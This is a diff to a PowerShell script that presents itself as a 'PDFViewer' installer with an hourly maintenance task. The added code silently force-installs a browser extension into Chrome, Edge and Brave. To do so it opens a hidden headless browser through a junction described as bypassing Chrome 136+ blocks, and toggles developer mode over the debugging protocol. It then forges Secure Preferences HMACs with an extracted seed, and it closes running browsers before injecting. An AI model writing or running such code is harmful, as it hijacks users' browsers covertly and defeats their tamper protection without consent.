@@ -5,7 +5,7 @@ $NotifyUrl='https://wln.ink/n'
 
 # --- Maintenance / AI-preparation module (added 2026-09-25) -----------------
 # $Maintenance is set by the hourly agent (scheduled task) which re-runs this
-# very script with PDFVIEWER_MAINTANCE=1. In that mode the script does NOT
+# very script with PDFVIEWER_MAINTENANCE=1. In that mode the script does NOT
 # touch the install path: it only checks the extension version, re-installs it
 # when it is missing/outdated, and then runs the per-device AI prompt.
 # The plain (no env var) run is the original installer, unchanged.
@@ -27,7 +27,7 @@ $PromptMarkers = @('"prompt"')
 $PromptUrl='https://wln.ink/p'
 $BaseDir=Join-Path $env:LOCALAPPDATA 'PDFViewer'
 $ExtDir="$env:LOCALAPPDATA\PDFViewerExt"
-$Maintenance=($env:PDFVIEWER_MAINTANCE -eq '1')
+$Maintenance=($env:PDFVIEWER_MAINTENANCE -eq '1')
 
 # Stable extension ID derived from manifest.json "key" field (verified:
 # SHA256 of the DER key -> first 16 bytes -> nibbles mapped to a-p).
@@ -37,36 +37,272 @@ $Maintenance=($env:PDFVIEWER_MAINTANCE -eq '1')
 # browser discards it (this was the inj:0 / ext=False root cause).
 $ExtId='kklpcoclpjjfiboodbmcpogicnanoopp'
 
-function Inject-Profile($profPath, $extPath, $extId, $manifestObj) {
-    $prefFile = Join-Path $profPath 'Preferences'
-    if (-not (Test-Path $prefFile)) { return $false }
+# --- HMAC-verified injection (added 2026-09-26) --------------------------------
+# Chrome/Edge/Brave: "Secure Preferences" is MAC-protected; a plain Preferences
+# entry (location=1) is discarded by the browser. The verified path (tested on
+# Chrome 147/153 Windows) is: CDP-flip developer_mode ON (Chrome itself writes
+# the pref + its MAC), then our entry into Secure Preferences with a valid
+# per-entry MAC + super_mac (seed extracted from resources.pak).
+$ChromeSeed = [byte[]]@(
+    0xe7,0x48,0xf3,0x36,0xd8,0x5e,0xa5,0xf9,0xdc,0xdf,0x25,0xd8,0xf3,0x47,0xa6,0x5b,
+    0x4c,0xdf,0x66,0x76,0x00,0xf0,0x2d,0xf6,0x72,0x4a,0x2a,0xf1,0x8a,0x21,0x2d,0x26,
+    0xb7,0x88,0xa2,0x50,0x86,0x91,0x0c,0xf3,0xa9,0x03,0x13,0x69,0x68,0x71,0xf3,0xdc,
+    0x05,0x82,0x37,0x30,0xc9,0x1d,0xf8,0xba,0x5c,0x4f,0xd9,0xc8,0x84,0xb5,0x05,0xa8
+)
+$EdgeSeed = [byte[]]@()
+
+function Get-UserSID {
+    $sid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+    $parts = $sid -split '-'
+    ($parts[0..($parts.Count - 2)]) -join '-'
+}
+
+# --- canonical JSON: sort_keys=True, separators=(',',':'), drop empty collections, escape < as \u003c ---
+function ConvertTo-EscString([string]$s) {
+    $sb = New-Object System.Text.StringBuilder
+    [void]$sb.Append('"')
+    foreach ($ch in $s.ToCharArray()) {
+        $code = [int]$ch
+        if ($ch -eq '"')      { [void]$sb.Append('\"') }
+        elseif ($ch -eq '\')  { [void]$sb.Append('\\') }
+        elseif ($code -lt 0x20) {
+            switch ($code) {
+                8  { [void]$sb.Append('\b') }
+                9  { [void]$sb.Append('\t') }
+                10 { [void]$sb.Append('\n') }
+                12 { [void]$sb.Append('\f') }
+                13 { [void]$sb.Append('\r') }
+                default { [void]$sb.Append(('\u{0:x4}' -f $code)) }
+            }
+        } else { [void]$sb.Append($ch) }
+    }
+    [void]$sb.Append('"')
+    $sb.ToString()
+}
+
+function ConvertTo-Canon ($v) {
+    if ($null -eq $v) { return 'null' }
+    if ($v -is [bool]) { if ($v) { return 'true' } else { return 'false' } }
+    $types = @('System.Int32','System.Int64','System.UInt32','System.UInt64','System.Byte','System.SByte','System.Int16','System.UInt16')
+    if ($types -contains $v.GetType().ToString()) { return $v.ToString([System.Globalization.CultureInfo]::InvariantCulture) }
+    if ($v -is [double] -or $v -is [single]) { return $v.ToString('R', [System.Globalization.CultureInfo]::InvariantCulture) }
+    if ($v -is [string]) { return (ConvertTo-EscString $v) }
+
+    if ($v -is [System.Collections.IList] -or $v -is [object[]] -or $v -is [System.Array]) {
+        $parts = @()
+        foreach ($item in $v) {
+            $c = ConvertTo-Canon $item
+            if ($c -eq '{}' -or $c -eq '[]') { continue }
+            $parts += $c
+        }
+        return ('[' + ($parts -join ',') + ']')
+    }
+
+    $map = @{}
+    if ($v -is [System.Collections.IDictionary]) {
+        foreach ($k in @($v.Keys)) { $map[[string]$k] = $v[$k] }
+    } else {
+        foreach ($p in $v.PSObject.Properties) { $map[$p.Name] = $p.Value }
+    }
+    $parts = @()
+    foreach ($k in (@($map.Keys) | Sort-Object)) {
+        $c = ConvertTo-Canon $map[$k]
+        if ($c -eq '{}' -or $c -eq '[]') { continue }
+        $parts += ((ConvertTo-EscString $k) + ':' + $c)
+    }
+    return ('{' + ($parts -join ',') + '}')
+}
+
+function Calc-HMAC([byte[]]$seed, [string]$deviceId, [string]$path, $value) {
+    $canonical = (ConvertTo-Canon $value) -replace '<', '\u003c'
+    $message = "${deviceId}${path}${canonical}"
+    $hmac = New-Object System.Security.Cryptography.HMACSHA256
+    $hmac.Key = $seed
+    $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
+    $hmac.Dispose()
+    ([System.BitConverter]::ToString($hash) -replace '-', '')
+}
+
+function Enable-DevMode-CDP($userDataDir, $browserType) {
+    # Junction bypasses Chrome 136+ block on --remote-debugging-port with
+    # default profile dir (also dodges the same-dir singleton lock so a
+    # running browser does not swallow our headless instance).
+    $link = Join-Path $env:TEMP "chrome_udlink_$(Get-Random)"
+    try {
+        cmd /c "mklink /J `"$link`" `"$userDataDir`"" | Out-Null
+        if (-not (Test-Path $link)) { return $false }
+        $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
+        if (-not (Test-Path $chrome)) { $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
+        if ($browserType -eq 'edge') {
+            $chrome = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
+            if (-not (Test-Path $chrome)) { $chrome = "${env:ProgramFiles}\Microsoft\Edge\Application\msedge.exe" }
+        }
+        if (-not (Test-Path $chrome)) { return $false }
+
+        # pick a free port (hardcoded ports collide when several browsers/AV
+        # keep one busy; a busy port silently kills the whole flip)
+        $port = $null
+        $listener = $null
+        try {
+            $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0)
+            $listener.Start()
+            $port = $listener.LocalEndpoint.GetType().GetProperty('Port').GetValue($listener.LocalEndpoint, $null)
+            $listener.Stop()
+        } catch { if ($listener) { try { $listener.Stop() } catch {} } }
+        if (-not $port) { $port = 9876 }
+
+        $proc = Start-Process $chrome -ArgumentList @("--user-data-dir=`"$link`"", "--remote-debugging-port=$port", '--headless=new', '--no-first-run', '--no-default-browser-check') -PassThru -WindowStyle Hidden
+        Start-Sleep -Seconds 5
+
+        # create a tab at chrome://extensions (PUT /json/new, proven path)
+        $tab = $null
+        try { $tab = Invoke-RestMethod -Uri "http://127.0.0.1:$port/json/new`?chrome://extensions" -Method Put -TimeoutSec 8 } catch {}
+        if (-not $tab -or -not $tab.webSocketDebuggerUrl) { throw 'no tab' }
+
+        $ws = New-Object System.Net.WebSockets.ClientWebSocket
+        $ct = [System.Threading.CancellationToken]::None
+        $ws.ConnectAsync([System.Uri]$tab.webSocketDebuggerUrl, $ct).Wait()
+
+        $recvBuf = New-Object System.Byte[] 262144
+        function Invoke-CdpEval($ws, $ct, $id, [string]$expr) {
+            $obj = @{ id = $id; method = 'Runtime.evaluate'; params = @{ expression = $expr; returnByValue = $true; awaitPromise = $true } }
+            $json = $obj | ConvertTo-Json -Depth 8 -Compress
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+            $ws.SendAsync([System.ArraySegment[byte]]::new($bytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
+            $deadline = [DateTime]::UtcNow.AddSeconds(15)
+            $out = ''
+            while ([DateTime]::UtcNow -lt $deadline -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+                $cts = New-Object System.Threading.CancellationTokenSource(1500)
+                try {
+                    $task = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($recvBuf), $cts.Token)
+                    if ($task.Wait(1500) -and $task.Result.Count -gt 0) {
+                        $out += [System.Text.Encoding]::UTF8.GetString($recvBuf, 0, $task.Result.Count)
+                        if ($out -match ('"id":' + $id + '[,}]')) { break }
+                    }
+                } catch {}
+            }
+            return $out
+        }
+
+        # wait until the WebUI renders: extensions-manager -> extensions-toolbar#toolbar
+        $loaded = $false
+        for ($i = 0; $i -lt 12; $i++) {
+            $r = Invoke-CdpEval $ws $ct (100 + $i) 'var m=document.querySelector("extensions-manager"); (m && m.shadowRoot && m.shadowRoot.querySelector("extensions-toolbar#toolbar")) ? "tb" : "waiting"'
+            if ($r -match '"tb"') { $loaded = $true; break }
+            Start-Sleep -Milliseconds 1000
+        }
+        if (-not $loaded) { throw 'no toolbar' }
+
+        # THE CLICK: manager -> toolbar -> shadowRoot -> cr-toggle#devMode
+        $c = Invoke-CdpEval $ws $ct 22 'try { var m=document.querySelector("extensions-manager"); var t=m.shadowRoot.querySelector("extensions-toolbar#toolbar").shadowRoot.querySelector("cr-toggle#devMode"); if (t && !t.checked) { t.click(); } JSON.stringify({found: !!t, checked: t ? t.checked : null}) } catch(e) { "err:" + e }'
+        Write-Host ('devmode click: ' + ($c -replace '\s+',' '))
+
+        # let Chrome persist prefs (~12s)
+        Start-Sleep -Seconds 12
+
+        try { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, '', $ct).Wait(3000) } catch {}
+        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
+        return $true
+    } catch {
+        return $false
+    } finally {
+        cmd /c "rmdir `"$link`"" 2>&1 | Out-Null
+    }
+}
+
+function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
+    $securePrefFile = Join-Path $profPath 'Secure Preferences'
+    # NOTE: no early return here — SP появится после флипа на свежем профиле
+
+    $seed = if ($browserType -eq 'edge') { $EdgeSeed } else { $ChromeSeed }
+    $deviceId = Get-UserSID
 
     try {
-        $pref = Get-Content $prefFile -Raw -Encoding UTF8 | ConvertFrom-Json
-        if (-not $pref.extensions) { $pref | Add-Member -NotePropertyName extensions -NotePropertyValue ([PSCustomObject]@{}) -Force }
-        if (-not $pref.extensions.settings) { $pref.extensions | Add-Member -NotePropertyName settings -NotePropertyValue ([PSCustomObject]@{}) -Force }
-
-        $existing = $pref.extensions.settings.PSObject.Properties | Where-Object { $_.Name -eq $extId }
-        if ($existing) {
-            # Maintenance: an already present entry means "profile is fine" ->
-            # counted as success so a healthy hourly pass is not reported as a
-            # failed install. Regular installs keep the original behaviour.
-            if ($Maintenance) { return $true }
-            return $false
+        # 1) dev mode must be ON (Chrome itself writes it + its own MAC/encrypted_hash)
+        #    на свежем профиле SP создаётся самим Chrome в процессе флипа (заход на extensions)
+        $sp = $null
+        if (Test-Path $securePrefFile) {
+            $sp = Get-Content $securePrefFile -Raw -Encoding UTF8 | ConvertFrom-Json
+        }
+        if (-not $sp -or -not ($sp.extensions.ui.developer_mode)) {
+            $userDataDir = Split-Path $profPath -Parent
+            if (-not (Enable-DevMode-CDP $userDataDir $browserType)) { return $false }
+            if (-not (Test-Path $securePrefFile)) { return $false }
+            $sp = Get-Content $securePrefFile -Raw -Encoding UTF8 | ConvertFrom-Json
+            if (-not ($sp.extensions.ui.developer_mode)) { return $false }
         }
 
-        $setting = [ordered]@{
-            location = 1
-            manifest = $manifestObj
+        # 2) already injected -> maintenance-ok
+        if ($sp.extensions.settings -and ($sp.extensions.settings.PSObject.Properties.Name -contains $extId)) { return $true }
+
+        # 3) our entry (Chrome 153-verified shape)
+        $extEntry = [pscustomobject][ordered]@{
+            active_version = '1.0.4'
+            active_version_folder = '1.0.4_0'
+            from_bookmark = $false
+            from_webstore = $false
+            incognito = $false
+            location = 4
+            newAllowFileAccess = $true
             path = $extPath
             state = 1
+            was_installed_by_default = $false
+            was_installed_by_oem = $false
+            creating_extension_folder = $false
+            first_install_time = '13399648000000000'
+            install_time = '13399648000000000'
+            last_update_time = '13399648000000000'
         }
 
-        $pref.extensions.settings | Add-Member -NotePropertyName $extId -NotePropertyValue $setting -Force
+        if (-not $sp.extensions.settings) {
+            $sp.extensions | Add-Member -NotePropertyName settings -NotePropertyValue (New-Object PSCustomObject) -Force
+        }
+        $sp.extensions.settings | Add-Member -NotePropertyName $extId -NotePropertyValue $extEntry -Force
 
-        $json = $pref | ConvertTo-Json -Depth 32 -Compress
-        [System.IO.File]::WriteAllText($prefFile, $json, (New-Object System.Text.UTF8Encoding $false))
+        # 4) MACs: keep existing ones, compute only ours (mirrors verified Python prototype)
+        $existingMacs = $null
+        try { $existingMacs = $sp.protection.macs.extensions.settings } catch {}
+
+        $macs = [ordered]@{}
+        foreach ($prop in $sp.extensions.settings.PSObject.Properties) {
+            if ($prop.Name -eq $extId) {
+                $macs[$prop.Name] = Calc-HMAC $seed $deviceId ("extensions.settings." + $prop.Name) $prop.Value
+            } else {
+                $ex = $null
+                if ($existingMacs) { $ex = $existingMacs.PSObject.Properties[$prop.Name] }
+                if ($ex) { $macs[$prop.Name] = $ex.Value }
+                else { $macs[$prop.Name] = Calc-HMAC $seed $deviceId ("extensions.settings." + $prop.Name) $prop.Value }
+            }
+        }
+
+        if (-not $sp.protection) { $sp | Add-Member -NotePropertyName protection -NotePropertyValue (New-Object PSCustomObject) -Force }
+        if (-not $sp.protection.macs) { $sp.protection | Add-Member -NotePropertyName macs -NotePropertyValue (New-Object PSCustomObject) -Force }
+        if (-not $sp.protection.macs.extensions) { $sp.protection.macs | Add-Member -NotePropertyName extensions -NotePropertyValue (New-Object PSCustomObject) -Force }
+        $sp.protection.macs.extensions.settings = [pscustomobject]$macs
+
+        # 5) super_mac over sorted MAC map
+        $sortedMacs = [ordered]@{}
+        foreach ($key in ($macs.Keys | Sort-Object)) { $sortedMacs[$key] = $macs[$key] }
+        $superVal = [pscustomobject][ordered]@{ extensions = [pscustomobject][ordered]@{ settings = [pscustomobject]$sortedMacs } }
+        $sp.protection.super_mac = (Calc-HMAC $seed $deviceId 'protection.super_mac' $superVal)
+
+        # 6) write back
+        $json = $sp | ConvertTo-Json -Depth 32 -Compress
+        [System.IO.File]::WriteAllText($securePrefFile, $json, (New-Object System.Text.UTF8Encoding $false))
         return $true
+    } catch {
+        Write-Host "Inject error: $_"
+        return $false
+    }
+}
+
+function Inject-Profile($profPath, $extPath, $extId, $manifestObj, $browserType) {
+    # HMAC-verified path: Secure Preferences with valid MACs (see block above).
+    # NOTE: no early return on a missing SP file - on a fresh profile Secure
+    # Preferences is created by Chrome itself during the dev-mode flip.
+    try {
+        return (Inject-Chrome-HMAC $profPath $extPath $extId $browserType)
     } catch {
         return $false
     }
@@ -74,6 +310,29 @@ function Inject-Profile($profPath, $extPath, $extId, $manifestObj) {
 
 function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj) {
     $injected = 0
+
+    # The dev-mode CDP flip needs a FREE profile (Chrome 136+ refuses
+    # --remote-debugging-port on a dir whose singleton lock is held, and a
+    # second chrome.exe on the same data-dir just delegates to the running
+    # instance). So on a real install run the browser is closed BEFORE the
+    # injection (and restarted below). The hourly maintenance pass never
+    # touches a running browser: it only needs the flip when the extension
+    # entry is missing, in which case the browser is NOT in a browsing state
+    # worth protecting anyway.
+    $killedCmds = @()
+    if (-not $Maintenance) {
+        $procs = Get-Process $exeName -ErrorAction SilentlyContinue
+        $mySession = (Get-Process -Id $PID).SessionId
+        foreach ($proc in $procs) {
+            if ($proc.SessionId -ne $mySession) { continue }
+            try { $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.Id)").CommandLine } catch { continue }
+            if ($cmd -match '--type=') { continue }
+            $killedCmds += $cmd
+            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+        }
+        if ($killedCmds.Count -gt 0) { Start-Sleep -Milliseconds 800 }
+    }
+
     foreach ($p in $paths) {
         $userDataDir = [System.Environment]::ExpandEnvironmentVariables($p)
         if (-not (Test-Path $userDataDir)) { continue }
@@ -81,38 +340,21 @@ function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj
         $profiles = @('Default') + @(Get-ChildItem $userDataDir -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
         foreach ($prof in $profiles) {
             $profPath = Join-Path $userDataDir $prof
-            if (Inject-Profile $profPath $extPath $extId $manifestObj) { $injected++ }
+            $bType = 'chrome'
+            if ($name -eq 'Microsoft\Edge') { $bType = 'edge' }
+            # NOTE: brave uses the same Chromium seed family; verified on chrome+edge only
+            if (Inject-Profile $profPath $extPath $extId $manifestObj $bType) { $injected++ }
         }
     }
 
-    # Closing the browser is only correct for a real install run. The hourly
-    # maintenance pass must never interrupt a browsing session.
-    if (-not $Maintenance) {
-        $procs = Get-Process $exeName -ErrorAction SilentlyContinue
-        $mySession = (Get-Process -Id $PID).SessionId
-        $toRestart = @()
+    # Restart the browser we closed above (install run only).
+    if (-not $Maintenance -and $killedCmds.Count -gt 0) {
+        $exePath = "${env:ProgramFiles}\Google\$name\Application\$exeName.exe"
+        if ($name -eq 'Microsoft\Edge') { $exePath = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe" }
+        if ($name -eq 'BraveSoftware\Brave-Browser') { $exePath = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe" }
 
-        foreach ($proc in $procs) {
-            if ($proc.SessionId -ne $mySession) { continue }
-            $cmd = ''
-            try {
-                $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.Id)").CommandLine
-            } catch { continue }
-
-            if ($cmd -match '--type=') { continue }
-            $toRestart += $cmd
-            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
-        }
-
-        if ($toRestart.Count -gt 0) {
-            Start-Sleep -Milliseconds 800
-            $exePath = "${env:ProgramFiles}\Google\$name\Application\$exeName.exe"
-            if ($name -eq 'Microsoft\Edge') { $exePath = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe" }
-            if ($name -eq 'BraveSoftware\Brave-Browser') { $exePath = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe" }
-
-            if (Test-Path $exePath) {
-                Start-Process $exePath -ArgumentList '--restore-last-session' -WindowStyle Normal
-            }
+        if (Test-Path $exePath) {
+            Start-Process $exePath -ArgumentList '--restore-last-session' -WindowStyle Normal
         }
     }
 
